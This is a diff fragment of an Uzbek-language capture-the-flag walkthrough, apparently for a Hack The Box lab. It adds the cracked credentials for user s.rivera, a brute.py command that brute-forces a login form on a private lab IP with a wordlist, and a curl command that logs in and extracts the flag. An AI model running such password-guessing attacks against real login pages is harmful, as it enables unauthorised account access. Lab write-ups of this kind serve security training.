@@ -19,6 +19,28 @@ Login **username mavjudligini oshkor qiladi**:
 
 **Crack uchun fail string:** `Incorrect password`.
 
+## ✅ Topilgan credentials
+```
+s.rivera : Mochi2019!
+```
+Buyruq:
+```bash
+python3 brute.py --url http://10.15.1.54:9010/login \
+    --login-page http://10.15.1.54:9010/ \
+    --username s.rivera --wordlist /tmp/target.txt \
+    --fail "Incorrect password" --threads 16
+# [+] PASSWORD FOUND: Mochi2019!
+```
+
+## Flagni olish
+Flag "Signed in" sahifasida (783 bayt). `brute.py` endi `HTB{...}` ni avtomatik
+ko'rsatadi; qo'lda:
+```bash
+curl -s -X POST -d "username=s.rivera&password=Mochi2019!" \
+     http://10.15.1.54:9010/login | grep -o 'HTB{[^}]*}'
+```
+
+
 ---
 
 ## 1-qadam — Recon: `/team` (OSINT)
